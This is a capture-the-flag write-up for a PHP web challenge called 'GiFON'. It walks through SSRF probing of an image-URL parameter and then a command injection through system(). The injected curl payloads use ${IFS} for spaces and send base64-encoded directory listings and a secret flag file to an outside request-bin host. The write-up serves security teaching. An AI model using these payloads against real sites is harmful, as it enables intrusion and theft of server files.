# GiFON
Category: Web, 200 points


## Description

> Jeff D. Spleier applied for a job in the ISA. His interview went really well and he seemed the right man for the job.
> 
> Naturally, we decided not to recruit him.
> 
> We suspect that he is in possession of some classified documents that must not be leaked. We worry that he might act out his revenge and publish them. We know that he maintains an online Gif Displayer. Probably irrelevant, but who knows?

## Solution:

We visit the attached link and arrive to a website called "The Gif Displayer".

It has a dropdown menu:

```html
<select class="form-control" id="pic" name="pic">
    <option disabled selected value> -- select an option -- </option>
    <option value="https://media.giphy.com/media/SggILpMXO7Xt6/giphy.gif">Dogs</option>
    <option value="https://media.giphy.com/media/l1KVboXQeiaX7FHgI/giphy.gif">Monkey</option>
    <option value="https://media.giphy.com/media/xULW8PLGQwyZNaw68U/giphy.gif">Gremlims</option>
    <option value="https://media.giphy.com/media/SwCuRzaVTkxvTpEDzO/giphy.gif">Dog 2</option>
    <option value="https://media.giphy.com/media/l4FGr3nzq5u0m02vm/giphy.gif">Baby</option>
</select>
```

Once we select an image, it is displayed on the webpage together with a hash:
```html
<div class="col-lg-12 ">
    <img class="col-lg-12 order-lg-2 text-white showcase-img" src='https://media.giphy.com/media/SggILpMXO7Xt6/giphy.gif'>
    <div class="col-lg-12 order-lg-2">file md5: 59ce667c5cb01232122c426168265bf2</div>
</div>
```

The displayed hash is the hash of the contents of the GIF file:
```console
root@kali:/media/sf_CTFs/shabak/GiFON# curl https://media.giphy.com/media/SggILpMXO7Xt6/giphy.gif -s --output - | md5sum
59ce667c5cb01232122c426168265bf2  -
```

Of course, when we see a URL such as `http://gifon.shieldchallenges.com/?pic=https%3A%2F%2Fmedia.giphy.com%2Fmedia%2FSggILpMXO7Xt6%2Fgiphy.gif`, the first thing we want to do is to exploit an SSRI vulnerability by providing a path to an internal resource.

If we try to access a resource such as `http://gifon.shieldchallenges.com/?pic=file:///etc/passwd`, we get an error response that `not a valid gif or http url`. From some trial and error, we learn that in order for a `pic` to be accepted, it must start with `http` and end with `.gif`. It's easy to end URLs with `.gif`, we just need to prepend a question mark (`http://www.example.com?.gif`) to make the required suffix act as a URL parameter. Having to start with `http` though means that we can't access interesting protocols such as `file` or `php`.

When we enter a URL that doesn't exist such as `http://gifon.shieldchallenges.com/?pic=http://127.0.0.1?.gif`, we might back a hash of `d41d8cd98f00b204e9800998ecf8427e` which is the hash value of an empty string:

```console
root@kali:/media/sf_CTFs/shabak/GiFON# echo -n "" | md5sum
d41d8cd98f00b204e9800998ecf8427e  -
```

In other cases, we might get back the MD5 of the error page itself, e.g. for `http://gifon.shieldchallenges.com/?pic=http://gifon.shieldchallenges.com/admin?.gif` we get a hash of `90dad6df7303a62e387f5c142a9b2cd4` which is the MD5 of a 404 page:

```console
root@kali:/media/sf_CTFs/shabak/GiFON# curl http://gifon.shieldchallenges.com/admin?.gif -s | md5sum
90dad6df7303a62e387f5c142a9b2cd4  -
```

Trying a few more things, we find out that we can access files on the internal server via `127.0.0.1:8080`. For example, `http://gifon.shieldchallenges.com/?pic=http://127.0.0.1:8080/img/testimonials-1.jpg?.gif` gives a hash of `828e0935e45611b23593d139bd1984f1`:

```
root@kali:/media/sf_CTFs/shabak/GiFON# curl http://gifon.shieldchallenges.com/img/testimonials-1.jpg --output - -s | md5sum
828e0935e45611b23593d139bd1984f1  -
```

But still, we can't find anything interesting anywhere.

Eventually, we started looking for known PHP quirks. 

First, we tried turning `pic` to an array by accessing `http://gifon.shieldchallenges.com/?pic[]=https://media.giphy.com/media/SggILpMXO7Xt6/giphy.gif`.

As a response, the website returned:

```html
<div class="col-lg-12 ">
<br />
    <b>Warning</b>:  strpos() expects parameter 1 to be string, array given in <b>/var/www/html/index.php</b> on line <b>85</b><br />
    <div class="col-lg-12 order-lg-2 text-danger">not a valid gif or http url</div>
</div>
```

This is good, the server is outputting error messages which are leaking implementation details. We now know that the application calls `strpos($pic)`. However the real jackpot comes from trying to access `http://gifon.shieldchallenges.com/?pic=https://%00media.giphy.com/media/SggILpMXO7Xt6/giphy.gif`:

```html
<div class="col-lg-12 order-lg-2">file md5: <br />
    <b>Warning</b>:  system(): NULL byte detected. Possible attack in <b>/var/www/html/index.php</b> on line <b>92</b><br />
    d41d8cd98f00b204e9800998ecf8427e
</div>
```

Instead of calculating the hash using PHP's `hash`, the application is calling `system`! This means we can try a command injection attack.

We setup a request bin and start by trying to list the files in the current directory by accessing `http://gifon.shieldchallenges.com/?pic=http;curl${IFS}https://enp465kxnap1p.x.pipedream.net/?a=$(ls${IFS}|${IFS}base64);.gif`. Note that we use `${IFS}` since we can't enter spaces. The output is:

```html
<div class="col-lg-12 ">
    <img class="col-lg-12 order-lg-2 text-white showcase-img" src='http;curl${IFS}https://enp465kxnap1p.x.pipedream.net/?a=$(ls${IFS}|${IFS}base64);.gif'>
    <div class="col-lg-12 order-lg-2">file md5: {"success":true}d41d8cd98f00b204e9800998ecf8427e</div>
</div>
```

`{"success":true}` looks like a good sign, and indeed - our request bin receives a hit with `Y3NzCmd1bHBmaWxlLmpzCmltZwppbmRleC5waHAKc2VjcmV0CnZlbmRvcgo=`:

```console
root@kali:/media/sf_CTFs/shabak/GiFON# echo Y3NzCmd1bHBmaWxlLmpzCmltZwppbmRleC5waHAKc2VjcmV0CnZlbmRvcgo= | base64 -d
css
gulpfile.js
img
index.php
secret
vendor
```

There's a `secret` folder there, let's try to access it:
```curl
root@kali:/media/sf_CTFs/shabak/GiFON# curl http://gifon.shieldchallenges.com/secret
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /secret
on this server.<br />
</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at gifon.shieldchallenges.com Port 80</address>
</body></html>
```

We can't access this address from outside, let's try to access it from inside with `http://gifon.shieldchallenges.com/?pic=http;curl${IFS}https://enp465kxnap1p.x.pipedream.net/?a=$(ls${IFS}secret|${IFS}base64);.gif`:

```console
root@kali:/media/sf_CTFs/shabak/GiFON# echo ZmxhZwo= | base64 -d
flag
```

What's left is to read the flag via `http://gifon.shieldchallenges.com/?pic=http;curl${IFS}https://enp465kxnap1p.x.pipedream.net/?a=$(cat${IFS}secret/flag|${IFS}base64);.gif`:

```console
root@kali:/media/sf_CTFs/shabak/GiFON# echo ZmxhZ3tESVMtSVMtRkxBRy1JLVItVkVSWS1INFgwUi1VLTI/fQ== | base64 -d
flag{DIS-IS-FLAG-I-R-VERY-H4X0R-U-2?}
```